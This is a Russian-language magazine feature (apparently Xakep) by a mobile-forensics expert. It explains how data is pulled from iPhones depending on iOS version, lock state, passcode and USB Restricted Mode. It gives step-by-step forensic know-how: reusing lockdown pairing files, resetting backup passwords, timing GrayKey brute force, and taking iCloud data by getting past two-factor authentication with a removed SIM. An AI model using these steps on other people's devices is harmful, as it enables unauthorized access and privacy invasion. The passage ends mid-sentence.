 • dresscode — библиотека для динами чес кого темин га приложения;
 • StateProgressBar — прогрес сбар с отметкой ста дий загрузки;
 • Android LoadX — функция‐расширение Kotlin, отображающая инди катор
   загрузки поверх любого View;
 • PowerMenu — простая в использовании биб лиотека для соз дания pop‐up‐
   меню;
 • InboxRecyclerView — рас ширя емый список в сти ле приложения Inbox;
 • PixelShot — простая библиотека для сохранения любого View в файл;
 • Covert — библиотека для создания swipe actions (дей ствий, вызываемых
   свайпом эле мен та в сторону) в списках RecyclerView;
 • download‐manager — библиотека для управления длительными загрузка‐
   ми, автоматически возобновляет скачивание файла;
 • AppListManager — библиотека для получения списков установленных при‐
   ложений и активностей.
 COVERSTORY





     Олег Афонин
  Эксперт по мобильной
криминалистике компании
      «Элкомсофт»
aoleg@voicecallcentral.com



КАК ВЗЛОМАТЬ
IPHONE

 РАЗБИРАЕМ ПО ШАГАМ
 ВСЕ ВАРИАНТЫ ДОСТУПА
 К ДАННЫМ УСТРОЙСТВ С IOS




 В этой статье мы подробно расскажем о том, что происходит
 с iPhone в криминалистической лаборатории. Мы выясним,
 насколько реально взломать защиту iOS раз ных версий и что
 для этого понадобится в разных случаях. Мы уже описывали
 несколько сторон этого про цесса, но сегодня разберем его
 целиком и пос тараемся охватить все возможные варианты.


  13 августа Русская служба Би‐би‐си со общила о закупке Следственным
  комитетом аппаратуры для взлома iPhone, которая вскроет самый свежий
  iPhone всего за девять минут. Не веришь? Я тоже не верю, что такое могло
  опубликовать столь солидное издание, но факт оста ется фактом.
    Хочется прокомментировать фразу эксперта Дмитрия Сатурченко: «Изра‐
  ильской Cellebrite для взлома iPhone 7 или 8 нужно больше суток, а извле чен‐
 ные данные требуют серь езной аналитики. MagiCube обрабаты вает тот же
  iPhone за девять минут, при этом обо рудо вание заточено на получе ние чувс‐
  твительных данных из мессенджеров, где содержится 80–90% интересной
 информации».
    У неподготов ленного читателя может создаться впечатление, что можно
  просто взять любой iPhone и извлечь из него информацию об использовании
 мессенджеров. Это не так по многим причинам. Начнем с того, что Mag‐
  iCube — дубликатор жестких дисков, а мобильные устройства анализирует
  другой комплекс. iPhone тоже подойдет не любой, а работающий строго
  под управлением iOS 10.0–11.1.2 (то есть ни разу не обновлявшийся пос‐
  ле 2 декабря 2017 года). Далее нам потребуется узнать (у пользовате ля)
  или взломать (сторонними решениями — GrayKey или Cellebrite) код бло‐
  кировки. И вот после это го, раз блокировав телефон, можно подключать его
  к китайскому комплексу и извлекать информацию.
    Несмотря на это, новость разошлась по массе изданий. «Специалисты»
  из SecurityLab, не удо сужившись ни пос тавить ссылку на первоисточник,
  ни даже указать автора, пишут: «Следственный комитет закупил аппарату ру
  для получения доступа к переписке». «По словам экспертов, для взлома пос‐
  ледних моделей iPhone комплексу MagiCube требуется поряд ка десяти
  минут».
    Что  же,  в  конце  кон цов, происходит? Можно  ли  взломать  iPhone
  7 или 8 за девять минут? Действитель но ли решение iDC‐4501 (а вовсе
  не MagiCube, который является всего лишь дубликатором жестких дисков)
  превосходит технологии Cellebrite и Grayshift? Наконец, как же все‐таки мож‐
  но взломать iPhone? Попробуем разобрать ся, что же именно закупил Следс‐
  твенный комитет, как и когда это работает и что делать в тех 99% случаев,
  когда комплекс не справляется с задачей.


 ЭТО ЗАВИСИТ…
 Прежде чем пытаться получить дос туп к iPhone, давай раз беремся, что и при
  каких условиях можно сделать. Да, у нас была масса публикаций, в том числе
  и весьма детальных, в которых мы описывали раз личные способы взлома
  устройств. Но вот перед тобой лежит черный кирпичик. Каким из многочис‐
  ленных способов и какими инстру ментами ты собира ешься воспользоваться?
  Получится ли это сделать вообще, а если получится — сколько времени зай‐
  мет взлом и на что ты можешь рассчитывать в результате?
     Да, очень многое зависит от модели устройства и установленной на нем
  версии iOS (которую, кстати, нужно еще узнать — и, забегая вперед, скажу:
  далеко не факт, что тебе это удас тся). Но даже iPhone вполне очевидной
  модели с точно известной версией iOS может находиться в одном из множес‐
  тва состояний, и именно от это го будет зависеть набор доступных тебе
  методов и инструментов.
    Для начала давай договоримся: мы будем рассматривать исключительно
  поколения iPhone, оборудо ванные 64‐раз рядны ми процессорами, то есть
  модели iPhone 5S, все версии iPhone 6/6s/7/8/Plus и текущий флагман —
  iPhone X. С точки зрения взло ма эти устройства отличаются мало (за исклю‐
  чением старых поколений в случае, если у тебя есть доступ к услугам ком‐
  пании Cellebrite).


 Установлен ли код бло кировки?
  Apple может использовать максимально стой кое шифрование, наворотить
  сложнейшую многоуровневую защиту, но защитить пользователей, которым
  «нечего скрывать», не сумеет никто. Если на iPhone не установлен код бло‐
  кировки, извлечь из него данные — дело тривиальное. Начать можно за те
 самые девять минут, о которых говорилось в статье Би‐би‐си. Вероятно, про‐
  цесс займет более длительное время: на копирование 100 Гбайт данных ухо‐
  дит порядка двух часов. Что для это го требует ся?
    Во‐первых, подключи телефон к компьюте ру, установи доверенные отно‐
 шения и создай резервную копию. Для это го можно использовать даже iTunes
  (предварительно обязательно отключи в нем двустороннюю синхронизацию),
  но специалисты предпочтут свое ПО.


 Установлен ли пароль на резервную копию?
 Не установлен? Установи и сделай еще одну резервную копию!





 Зачем устанавливать пароль на бэкап? Дело в том, что заметная часть
 информации в резервных копиях iOS шифруется даже тогда, когда поль‐
  зователь такого пароля не устанавливал. В таких случаях для шифрования
  используется уникальный для каждого устройства ключ. Лучше установить
  на бэкап любой известный тебе пароль; тогда резервная копия, включая
  «секретные» данные, будет зашифрована этим же паролем. Из интерес‐
  ного — ты получишь доступ к защищенному хра нилищу keychain, то есть
  ко всем паролям поль зователя, сохраненным в браузере Safari и многих
  встроенных и сторонних приложениях.
    А что, если пароль на резервную копию установлен и ты его не знаешь?
 Маловероятно для людей, которым нечего скрывать, но все же? Для устрой‐
  ств, работающих на старых вер сиях iOS (8.x–10.x), единственный вари ант —
  перебор. И если для iOS 8–10.1 ско рость атаки была приемлемой (сотни
  тысяч паролей в секунду на GPU), то начиная с iOS 10.2 лобовая атака
  не вариант: скорость перебо ра не превышает сотни паролей в секунду даже
  при использовании мощного гра фического ускорителя. Впрочем, можно поп‐
  робовать извлечь пароли, которые пользователь сохранил, например, в бра‐
  узере Chrome на персональном компь юте ре, составить из них словарик
  и использовать его в качес тве базового сло варя для атаки. (Не поверишь:
  такая простая так тика сра батывает пример но в двух случаях из трех.)
    А вот устройства на iOS 11 и 12 поз воляют запросто сбросить пароль
  на резервную копию прямо из настроек iPhone. При этом сбросятся некото‐
 рые настройки, такие как яркость экрана и пароли Wi‐Fi, но все при ложе ния
  и их данные, а также пароли пользователя в keychain останутся на месте. Если
  есть код блокировки, его потребуется ввести, но если он не установлен, то
  сброс пароля на бэкап — дело нескольких кликов.





   Для сброса пароля на резервную копию исполь зуй команду Reset All Set‐
     tings. Она сбросит лишь некоторые настройки, вклю чая пароль на бэкап,
   но не затронет данные

  Что еще можно извлечь из устройства с пустым кодом блокировки? Не при‐
  бегая к джейлбрейку, совершенно спокойно можно извлечь следующий
  набор данных:
   • полную информацию об устройстве;
   • информацию о поль зователе, учетных записях Apple, номере телефона
    (даже если SIM‐карту извлекли);
   • список установленных приложений;
   • медиафайлы: фото и видео;
   • файлы приложений (например, документы iBooks);
   • системные журналы crash logs (в них, в час тности, можно обнаружить
    информацию о приложениях, которые были впоследствии деинстал‐
    лированы из системы);
   • уже упомянутую резервную копию в формате iTunes, в которую попадут
    данные многих (не всех) приложений и пароли пользовате ля от соци аль‐
    ных сетей, сайтов, маркеры аутентифика ции и многое другое.





   Примерно так выглядит интерфейс приложения, которое извлекает
   информацию из iPhone


 Джейлбрейк и физическое извле чение дан ных
  Если тебе не хватило информации, извлеченной из бэкапа, или если не уда‐
  лось подобрать пароль к зашифрованной резервной копии, остается только
  джейл. Сейчас jailbreak существу ет для всех версий iOS 8.x, 9.x, 10.0–11.2.1
  (более ранние не рассмат риваем). Для iOS 11.3.x есть джейл Electra, который
  работает и на более ранних версиях iOS 11.
    Для установки джейлбрейка нужно воспользоваться одной из публично
  доступных утилит (Meridian, Electra и так далее) и инс трументом Cydia Im‐
  pactor. Существуют альтернативные способы взлома — например, эскалация
  привилегий без установки публичного джейлбрейка при помощи экс плуата‐
  ции известной уязвимос ти (напомню, для iOS 10–11.2.1 это одна и та же уяз‐
  вимость, информацию о которой, включая готовый исходный код, опуб‐
  ликовали специалисты Google). Объединяет все эти способы общий момент:
  для их использования необ ходимо, чтобы iPhone был разблокирован и связан
  с компьютером (установлены доверенные отно шения).
    Следующий шаг — извлечение образа файловой системы. Для этого
  в лучшем случае достаточно открыть с телефоном сессию по протоколу SSH
  и выполнить на iPhone цепочку команд; в более слож ных слу чаях потребу ется
  вручную прописать нужные пути в PATH либо воспользоваться готовым про‐
  дуктом. Результатом будет файл TAR, переданный через туннельное соеди‐
  нение.
    Если на смар тфоне уста новлена iOS 11.3.x, ставить джейлбрейк придется
  вручную, а для извлечения информации вос пользоваться утилитой iOS Foren‐
  sic Toolkit или другой подобной.
    Если же на iPhone работает iOS 11.4 или более свежая версия, то джейл
  придется отложить на неоп ределенное время — пока сообщество разработ‐
  чиков не нащупает очередную незакрытую уяз вимость. В этом случае тебе
  послужит резервная копия (а также извлечение общих фай лов приложений,
  фотографий и медиафайлов и некоторых системных журналов).
    Разумеется, в резервную копию попада ет не все. К примеру, в ней не сох‐
  раняется переписка в Telegram, в нее не попада ют сообщения электронной
  почты, а история данных мес тополо жения пользователя исключительно
  лаконична. Тем не менее резервная копия — это уже немало.
    А что, если пользователь не совсем бес печен и все‐таки установил код
  блокировки?





 Даже самые беспечные пользователи вынуждены использовать пасскод, если
  таково требование политики безопас ности их работодате ля или если они
  хотят использовать Apple Pay. И здесь два варианта: или код блокировки
  известен, или нет. Начнем с простого.


 Из вестен ли код бло кировки?
  Если ты знаешь код блокировки, то можешь сделать с устройством прак‐
  тически что угодно. Включить и раз блокировать — в любой момент. Поменять
  пароль от Apple ID, сбросить привяз ку к iCloud и отключить iCloud lock, вклю‐
  чить или выключить  двухфакторную  аутентифика цию,  сохранить пароли
  из локального keychain в облако и извлечь их оттуда. Для устройств с iOS
  11 и более новых — сбросить пароль на резервную копию, установить собс‐
  твенный и расшифровать все те же пароли от сай тов, разнообразных учетных
  записей и приложений.
   В iOS 11 и более новых код бло кировки, если он установлен, потребуется
  и для установки доверенных отношений с компь ютером. Это необходимо
  как для снятия резервной копии (здесь могут быть и другие вари анты — нап‐
  ример, через файл lockdown), так и для установки джейлбрейка.





   Для установки доверия между iPhone и компь ютером в iOS 11 и более
    новых требуется ввес ти код блокировки

 Сможешь ли ты установить джейлбрейк и вытащить те немногие, но потен‐
  циально ценные для рас следова ния данные, которые не попадают в резер‐
  вную копию? Это зависит от версии iOS:
   • iOS 8.x–9.x: джейлбрейк есть практичес ки для всех комбинаций ОС
    и платформ;
   • iOS 10.x–11.1.2: джейлбрейк использует откры тый эксплоит, обна‐
    руженный спе циалистами Google. Работает на всех устройствах;
   • iOS 11.2–11.3.x: джейлбрейк существу ет и может быть установлен;
   • iOS 11.4 и выше: в нас тоящий момент джей ла не существу ет.


              INFO

                           Итак, закупленный Следствен ным комитетом ком‐
                          плекс  iDC‐4501  позволяет  достичь  эска лации
                        привилегий в iPhone, работающих под управле‐
                       нием iOS версий с 10.0 по 11.1.2 включительно,
                        после чего извлечь из устройства данные.


 А что, если код блокировки неизвестен? В этом случае вероятность успешно
  извлечь хоть что‐нибудь начинает снижать ся. Впрочем, и здесь не все
  потеряно — в зависимос ти от того, в каком сос тоянии поступил на анализ
  телефон и какая версия iOS на нем установлена.


                                       Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
КАК ВЗЛОМАТЬ IPHONE
              РАЗБИРАЕМ ПО ШАГАМ ВСЕ ВАРИАНТЫ
              ДОСТУПА К ДАННЫМ УСТРОЙСТВ С IOS





Экран устройства заб локиро ван или раз бло киро ван?
Далеко не всегда в руки полиции попадает заблокированный телефон,
для  которого  известен  код блокировки. Доволь но  типична  «просьба»
полицейского: «Передайте мне телефон. Раз блокируйте!» По словам самих
работников полиции, если говорить уверенным тоном, да еще и на месте
происшествия, люди часто выполняют прось бу. Спустя 10–15 минут «они
начинают думать», но уже поздно: получить назад раз блокированное устрой‐
ство вряд ли удастся. Более того, у полиции может быть ордер, в котором
будет прописано разрешение на разблокировку устройства при помощи дат‐
чика отпе чатков или лица пользователя против воли владельца (а вот узнать
таким же образом код блокировки может не получиться в зависи мос ти
от юрисдикции).
   Apple встроила в iOS защиту от таких дей ствий полиции, ограничив пери‐
од, в течение которого датчики Touch ID и Face ID сохраняют работоспособ‐
ность. Спустя определенное время, которое может отсчитываться как с
момента последней разблокировки вооб ще, так и с момента последне го вво‐
да кода блокировки, iPhone при очередной попытке разблокировать устрой‐
ство предложит ввести код блокировки.





         С утра телефон попросил ввес ти код блокировки

Не будем подробно останавливаться на этой теме, тем более что о ней мы
уже писали. Достаточ но упомянуть, что биомет рические датчики отключаются
спустя 48 часов с момента последней разблокировки, или спустя восемь
часов, если пользователь не вводил код блокировки в течение шести дней,
или после пяти неудачных попыток сканирования, или после того, как поль‐
зователь активирует режим SOS, который появился в iOS 11.
   Итак, в твои руки попал iPhone, экран которого разблокирован. Твои дей‐
ствия?
 1. Постарайся отключить автоматичес кую бло кировку экрана в настрой ках.
   Учти, что, если на телефоне уста новлена корпоративная политика Ex‐
   change или MDM, такая воз можность может быть заблокирована.
 2. Подклю чи телефон к компь ютеру и попытай ся установить доверенные
   отношения. Для iOS c 8 по 10 для этого достаточно под твердить запрос
   Trust this computer, а вот для iOS 11 и выше тебе потребуется ввести код
   блокировки. Если же код блокировки неизвестен, попытай ся найти
   на компьюте ре пользователя файл lockdown (о том, что это такое и где
   хранится, мы уже неоднократно писали).
 3. Если удалось установить доверенные отношения, создай резервную
   копию.
 4. Если же доверенные отношения установить не удалось, а файл lockdown
   не нашелся или срок его действия истек, тебе придется воспользоваться
   комплексом GrayKey для подбора кода блокировки или услугами Cellebrite
   (их оказывают толь ко полиции и спецслуж бам некоторых стран).





  Корпоративная политика безопасности не позволя ет отключить авто‐
  матическую блокировку. Выход? Выделить человека, который будет
  тыкать в телефон, чтобы тот не спал

Подробнее про файлы lockdown можно почитать в статье Acquisition of a
Locked iPhone with a Lockdown Record. В двух словах: для того чтобы начать
обмениваться данными с компь ютером, iPhone требует установить доверен‐
ное соединение, в процессе которого соз дается пара криптографических
клю чей. Один из клю чей сохраня ется в самом устрой стве, а второй переда‐
ется на компьютер, где и хранится в виде обычного файла. Если такой файл
скопировать на другой компьютер или подсунуть телефону при помощи спе‐
циального ПО, то телефон будет уверен, что обща ется с доверенным компь‐
ютером. Сами файлы сохраня ются здесь:
 • в Windows Vista, 7, 8, 8.1, Windows 10 это %ProgramData%\Apple\
   Lockdown. Например:


   \ProgramData\Apple\Lockdown\6f3a363e89aaf8e8bd293ee83948573034
   4edba1.plist

 • в Windows XP это файл %AllUsersProfile%\Application Data\Apple\
   Lockdown. Выглядеть полный путь будет при мерно так:


   C:\Documents and Settings\All Users\Application Data\Apple\
   Lockdown\6f3a363e89aaf8e8bd293ee839485730344edba1.plist

 • в macOS это файл /var/db/lockdown.

В названии файла присутству ет  уникальный идентификатор  устройства
(iPhone или iPad). Узнать его довольно легко — дос таточно выполнить запрос
при помощи Elcomsoft iOS Forensic Toolkit. UUID будет сохранен в файл XML.


<?xml version="1.0″ encoding="UTF‐8″?>
<!DOCTYPE plist PUBLIC "‐//Apple//DTD PLIST 1.0//EN" "http://www.
apple.com/DTDs/PropertyList‐1.0.dtd">
<plist version="1.0">
    <dict>
        <…>
        <key>UniqueDeviceID</key>
        <string>0a226c3b263e004a76e6199c43c4072ca7c64a59</string>
    </dict>
</plist>

Срок жизни файлов lockdown в iOS 11 и более новых версиях ограничен и в
точности неизвестен. Экспериментально уда лось установить, что устройства,
которые не подключались к доверенному компьютеру дольше двух месяцев,
иногда тре буют повторного уста новления доверенных отношений, так что
старые файлы могут не сработать.


             INFO

                     Возвращаемся с истории с СК. Закупленный ком‐
                        плекс iDC‐4501 поз воляет выполнить эскалацию
                      привилегий   на   разблокирован ном   iPhone
                      под       управлением       iOS       версий
                        с  10.0  по  11.1.2  включительно,  после  чего
                        извлечь из устройства дан ные. Для iOS 11.0–
                            11.1.2, возможно, потребуется или ввести код
                      блокировки, или использовать файл  lockdown
                           (этот момент в документации комплекса не осве‐
                      щен,  как  и  возможность  взлома  пасскода
                       для любых iPhone под управлением iOS новее,
                     чем iOS 7.x).


Еще чуть больше информации ты смо жешь получить, если у тебя есть дос туп
к биометрике пользователя — его отпечат ку паль ца или лицу. Тогда ты смо‐
жешь просмотреть пароли из локального хра нилища keychain.


ВКЛЮЧЕН IPHONE ИЛИ ВЫКЛЮЧЕН?
От такой простой вещи зависит очень и очень мно гое. Если iPhone включен,
то велик шанс на то, что владелец раз блокировал устройство хотя бы раз
с момента включения. Это, в свою очередь, означает наличие доступа
к зашифрованному поль зовательскому раз делу — то есть к установленным
приложениям и их данным, системным журналам и многому другому.
  В телефоне, который был раз блокирован хотя бы раз, работают сервисы
AFC, служба создания резервных копий, есть воз можность получить те дан‐
ные, к которым приложения открыли доступ. Наконец, можно извлечь фотог‐
рафии. Для  всего  этого даже не придет ся  разблокировать  телефон:
при определенной удаче дос таточно восполь зоваться файлом lockdown,
извлеченным из компьютера пользователя. Если же такого файла нет, можно
попытаться разблокировать телефон дат чиком отпечатка Touch ID или ска‐
нером лица Face ID.
   Итак, если тебе в руки попал включенный iPhone с заблокированным экра‐
ном, ты можешь попробовать сделать следующее.
 1. Подклю чить телефон к компьютеру. Если на телефоне появилось сооб‐
  щение Unlock iPhone to use accessories, а компьютер совершенно не видит
   устройства, то тебе не повез ло: вероятно, на устройстве работает iOS
   11.4.1 или более новая и прош ло больше часа с момента, когда поль‐
   зователь в последний раз раз блокировал устройство. Этот режим име ет
   название USB Restricted Mode и стал реакцией Apple на появление сер‐
   висов для взлома кода бло кировки —  в первую очередь GrayKey
   и Cellebrite. Увы, если телефон перешел в режим ограничения USB, тебе
   не удастся ни восполь зоваться файлом lockdown, ни подобрать код бло‐
   кировки при помощи сервисов GrayKey или  Cellebrite. Не поможет
   ни перезагрузка, ни даже восстановление прошивки через recovery mode
   с сохранением данных. Единс твенная воз можность — разблокировать
   телефон при помощи Face ID, Touch ID (о них — ниже; время, в течение
   которого можно использовать биометрику для разблокировки, ограниче‐
   но). Наконец, телефон всег да можно разблокировать, введя правильный
   код блокировки.
 2. Если телефон подклю чился к компь юте ру, то первое, что нужно сделать, —
   получить информацию об устройстве. В Elcomsoft iOS Forensic Toolkit
   для этого служит коман да Information. Даже без установления доверенных
   отношений с компьютером ты сможешь узнать версию iOS, точный иден‐
   тификатор модели, серийный номер устройства  и, воз можно, номер
   телефона пользователя (даже если из телефо на вынули SIM‐карту).
  В зависимости от установленной версии iOS тебе будут доступны те
   или иные способы доб раться до пользовательских данных.
 3. Если телефон подключился к компьютеру, а у тебя на руках есть файл lock‐
  down  с  компьютера  пользователя —  счи тай,  что  тебе  повезло.
  При помощи этого файла можно попытаться соз дать свежую резервную
   копию — разблокировать телефон не придет ся! Впрочем, о файлах lock‐
  down мы уже писали; если файл дей ству ющий, то тебе удастся извлечь
   из телефона как минимум рас ширенную информацию об устройстве (если
   iPhone не был разблокирован хотя бы раз пос ле включения). А вот если
   телефон был разблокирован хотя бы единожды пос ле того, как его вклю‐
   чили, то при помощи файла lockdown получится извлечь и медиафайлы
   (фото и видео), и журнал crash logs, и фай лы приложений, и свежую резер‐
   вную копию (вот только пароль на бэкап, если он установлен, сбросить
   не получится — для это го нужен код блокировки).

Но что, если на руках у тебя классический черный кирпич без признаков жиз‐
ни? Если взломать требуется выключенный iPhone, тебе так или иначе пот‐
ребуется узнать код блокировки. Дело в том, что раз дел пользовательских
данных iPhone зашифрован, а ключ шифрования вычисляется динамичес ки
на основе аппаратного ключа и данных, которые вво дит пользователь, — того
самого кода бло кировки.
  Даже если ты извлечешь из телефо на микросхему памяти, тебе это ничем
не поможет: данные зашифрованы, доступа к ним нет. Более того: если
iPhone работает под управлением iOS 11.4.1 или более новой, то очень
высока вероятность, что до вво да пра виль ного пароля ты не сможешь даже
подклю чить устрой ство к компь ютеру. Точнее, физически подключить ты его
сможешь, но передача данных через USB будет заб локирована — не получит‐
ся даже получить информацию об устройстве и узнать, какая же версия iOS
на нем запущена.
   Итак, у тебя на руках заблокированный телефон, который можно подклю‐
чить к компьютеру. Попробуем взломать код блокировки?


В КАКИХ СЛУЧАЯХ МОЖНО ВЗЛОМАТЬ КОД БЛОКИРОВКИ
ЭКРАНА
Вот мы и дошли до самого интерес ного. Можно ли взломать iPhone за девять
минут? А за сутки? А в принципе? Если телефон заблокирован, а код бло‐
кировки неизвестен, многое будет зависеть от состояния устройства. Рас‐
смотрим все возможные обстоятельства, рас положив их в порядке возраста‐
ния сложности.
 1. На телефоне запущена старая вер сия iOS (до 11.4) и телефон раз бло‐
   кировался пользователем хотя бы раз с момента начальной загрузки.
  В этих весьма благоприятных условиях ты сможешь воспользоваться
   GrayKey или услугами Cellebrite (если ты представляешь правоохранитель‐
  ные органы). Скорость перебо ра будет высокой: четырехзначный циф‐
   ровой код блокировки можно подоб рать менее чем за час, а скорость
   перебора шестизначных цифровых  кодов  будет  высокой  для  пер‐
   вых 300 тысяч попыток. Дальше скорость перебора резко снизится — сра‐
   ботает защита Secure Enclave.
 2. На телефоне запущена старая версия iOS (до 11.4) и телефон не разбло‐
   кировался ни разу после включения, либо вер сия iOS 11.4 (неважно, раз‐
   блокировался ли телефон), либо вер сия iOS 11.4.1 и выше (неважно, раз‐
   блокировался ли телефон, но режим USB Restricted Mode не активировал‐
   ся — то есть прошло мень ше часа с пос ледней разблокировки устройства
   или телефон был подклю чен к цифровому адаптеру, чтобы пре дотвратить
   блокировку). Во всех этих случаях скорость перебора будет очень мед‐
   ленной: четырехзначные цифровые коды блокировки могут быть взломаны
   за неделю, а шестизначный цифровой код можно перебирать до двух лет.
 3. На телефоне запущена iOS 11.4.1 или более новая; активировал ся режим
  USB Restricted Mode. Увы, единственное, что мож но сделать в таком слу‐
   чае, — это попробовать разблокировать телефон датчиком Touch ID
   или Face ID либо ввес ти правиль ный код блокировки. Запустить автомати‐
   зированный перебор не удастся, как не удас тся и обойти уничтожение
   данных после десяти неверных попыток (если эта опция включена поль‐
   зователем).


КАК РАБОТАЕТ ВЗЛОМ КОДА БЛОКИРОВКИ
Для современных устройств с iOS 10 версий и 11 существует ровно два
решения, которые позволяют подобрать код блокировки экрана. Одно из них
разработала компания Cellebrite и предос тавля ет его в виде сервиса, дос‐
тупного исключительно пра воохранительным орга нам при наличии соответс‐
твующего постановления. Что бы взломать код блокировки, телефон нужно
отправить в сервисный центр компании; а что бы понять, возможен ли
перебор  в принципе, тебе предложат  запус тить специальную  ути литу.
Про решение Cellebrite извес тно мало; компания тщательно охраняет свои
секреты.
  Другое решение называется GrayKey — его разработала компания
Grayshift. Решение поставляется правоохранительным органам и некоторым
другим организациям, которые могут самос тоятель но заниматься перебором
паролей. Про GrayKey нам извес тно больше.
  Решение Grayshift не пользует ся режимом DFU (именно через него уда‐
лось взломать старые айфо ны) и загружа ет агент в режиме сис темы.
Перебор можно запустить как на устройствах, которые были раз блокированы
хотя бы раз после включения или перезагрузки, так и на «холодных» устрой‐
ствах, которые были только что включены. При этом скорость перебора отли‐
чается даже не в разы — на порядки.
   Так, для устрой ства, которое было хотя бы раз разблокировано после заг‐
рузки, полный перебор всех паролей из четырех цифр воз можен за 30 минут,
но для этого же устройства, если оно было только что включено, атака
на четырехзначный код будет длить ся до 70 дней, а про взлом шестизначных
цифровых паролей без  качес твенного словаря можно  забыть: полный
перебор займет десятилетия (устройством дается лишь одна попытка каждые
десять  минут). Правда, с шестизначными кодами  есть  тонкость:  пос‐
ле 300 тысяч попыток скорость перебо ра рез ко падает и устройство перехо‐
дит в режим медленного перебо ра.





                   Слайд с презентации Grayshift

Звучит неплохо (или плохо, в зависимости от точки зрения)? Увы, но «быс‐
трый» перебор возможен лишь для вер сий iOS до 11.3.1 включительно. Если
пользователь хотя бы раз обновлял свой iPhone пос ле 29 мая 2018 года, то
на устройстве будет работать iOS 11.4 или более новая. Там «быстрый»
перебор при помощи GrayKey невозможен. Для iOS 11.4 и более новых вер‐
сий скорость перебора GrayKey ограничена одним паролем в десять минут.
Это означает, что устройство с шес тизначным цифровым кодом блокировки
(а современные версии iOS именно такой код предлагают  установить
по умолчанию) взло мать будет практичес ки невозможно.


РЕЖИМ USB RESTRICTED MODE
Об этом режиме уже неоднократно писали, в том числе и на страницах
нашего журнала. Начиная с iOS 11.4.1 устройства iPhone и iPad пол ностью
блокируют обмен данными по про токолу USB спустя один час после того,
как устройство было раз блокировано или отклю чено от аксессу ара. Скорее
всего, этот режим был введен с целью противо дей ствия комплексам GrayKey
и  Cellebrite, которые поз воляют подоб рать код блокировки устройства
при помощи неизвестного Apple экс плоита. Режим оказал ся достаточно
эффективным: устрой ства с заблокированным портом невоз можно под клю‐
чить к соответствующей системе, и перебор не запус кается.





  Так выглядит экран iPhone, если попробовать подключить его к компь‐
  ютеру или аксессуару спустя час после блокировки экрана или отклю‐
  чения от компьюте ра или аксессу ара

Можно ли обойти режим защиты USB? Во‐первых, для активации передачи
данных достаточно разбло кировать телефон, например при помощи отпечат‐
ка пальца (который, в свою очередь, тоже не вечен — см. выше). Во‐вторых,
срабатывание  ограничения мож но  предотвратить,  подключив  телефон
до истечения часа с момента последней блокировки  к совместимому
аксессуару (годятся не все!) даже в заб локированном состоянии.
  Иными словами, при конфискации устройств сотрудни ку полиции придет‐
ся не только положить телефон в клетку Фарадея, но и подключить его к сов‐
местимому аксессуару (сгодится, к примеру, официальный переходник Apple
с Lightning на USB 3 с дополнитель ным портом с поддержкой зарядки). Если
этого не сделать, то всего через час телефон перейдет в защитный режим
и запустить перебор кодов бло кировки не удастся.
  Безопасность — нескончаемая гонка. В Apple зна ют о воз можнос ти обой‐
ти защитный режим USB и раз рабатывают технологию, которая будет бло‐
кировать передачу данных мгновенно пос ле блокировки устройства. Если эта
возможность войдет в состав очередной сборки iOS (а это не факт), то
передача данных по протоко лу USB будет автоматически деактивирована
сразу после блокировки экрана устройства — подклю чать телефон к аксессу‐
арам или компьюте ру придет ся в раз блокированном состоянии.
  Ради  удобства  пользователя сделаны исклю чения  для  переходника
на аудиоразъем (впрочем, его подключение никак не влияет на срабаты вание
USB Restricted Mode) и для зарядки от обычных зарядных устройств — но не
от компьютерного порта.


ЧТО ДЕЛАТЬ, ЕСЛИ ТЕЛЕФОН ЗАБЛОКИРОВАН, СЛОМАН ИЛИ ЕГО
ВОВСЕ НЕТ
Как можно извлечь данные из заблокированного или сломанного устройства?
Примерно так же, как и из устройства, которо го нет совсем: через облако
iCloud. Полиция при наличии соот ветс твующего постановления может зап‐
росить  у Apple все данные из  учетной записи пользователя, включая
облачные резервные копии. Для всех прочих доступен другой способ:
при помощи Apple ID и пароля пользователя.
  Откуда взять Apple ID и пароль? Можно, к примеру, запус тить Elcomsoft In‐
ternet Password Breaker на компь ютере пользователя и посмотреть, не най‐
дется ли там пароль от Apple ID или iCloud (он будет одним и тем же).
Или попробовать сбросить через почту. Обойти двухфакторную аутентифика‐
цию, если она активирована, можно, получив SMS на SIM‐карту, извлеченную
из того же iPhone.
  Наконец, можно поис кать на компьютере поль зователя так называемый
маркер  аутентификации,  который  поз волит  авторизоваться  в  iCloud
без логина, пароля и вторичного фактора аутентификации. Разумеется,
как маркер аутентифика ции, так и пароль от Apple ID или iCloud может най‐
тись не в каждом случае, да и SIM‐карта может быть защищена собственным
PIN‐кодом, но если тебе уда лось обойти эти препятствия, то при помощи
специализированного софта (например, Elcomsoft Phone Breaker) ты смо‐
жешь скачать следующие вещи:
 • облачные резервные копии (до двух для каждого устройства в учетной
   записи);
 • синхронизированные данные. Здесь — раз долье: и список откры тых в Sa‐
    fari страниц с историей посещений, и кален дари, и заметки, и контакты,
   и даже журнал звонков и все текстовые сообщения, включая iMessage (для
   iMessage, правда, потребуется как пароль, так и код блокировки одного
   из доверенных устрой ств пользователя). Если у пользовате ля есть Mac, то
   могут найтись и файлы, синхронизированные с компьютера, и даже
   депонированный ключ для рас шифровки раз дела FileVault 2;
 • если вклю чена iCloud Photo Library — то и фотографии;
 • если вклю чен iCloud Keychain, то и пароли пользователя от разных онлай‐
   новых ресурсов. Для это го потребуется ввести код блокировки одного
   из доверенных устройств пользователя.


ЗАКЛЮЧЕНИЕ
Если ты прочитал эту статью, вероятно, ты уже догадался, можно ли взломать
iPhone за девять минут при помощи «магического куба» или специализиро‐
ванного безымян ного комплекса для взлома мобиль ных устройств. Да, мож‐
но — если телефон работа ет под управлением iOS 10–11.2.1 (то есть
не получил обновление до iOS 11.2, вышедшее 2 декаб ря 2017 года) и был
любезно разблокирован подоз рева емым, не защищен кодом блокировки
или код блокировки известен.
   Если пользователь хоть раз обновил устройство после 2 декабря прош‐
лого года — магия не сработа ет. Если телефон заб локирован неизвес тным
паролем — магия не сработа ет, код блокировки придется взламывать
отдельным решением GrayKey или Cellebrite (которое, кстати, в случае успе ха
самостоятельно извлечет все данные). Если же телефон заблокирован
и работает под управлением свежей версии iOS 11.4.1, а с момента пос‐
ледней разблокировки или подклю чения к аксессуару прошло больше часа,
то не помогут и эти сервисы.
   Какова вероятность того, что телефон работает на iOS 11.4.1? По данным
независимых источников (Apteligent и StatCounter), на долю iOS 11.4.x при‐
ходится от 61 до 63% устройств. К сожалению, источники не делают различия
между iOS 11.4 и 11.4.1, однако историчес кие данные поз воляют пред‐
положить, что доля iOS 11.4.1 на конец августа 2018‐го составляет поряд‐
ка 57%. С уверенностью можно сказать, что именно эти 57% устройств
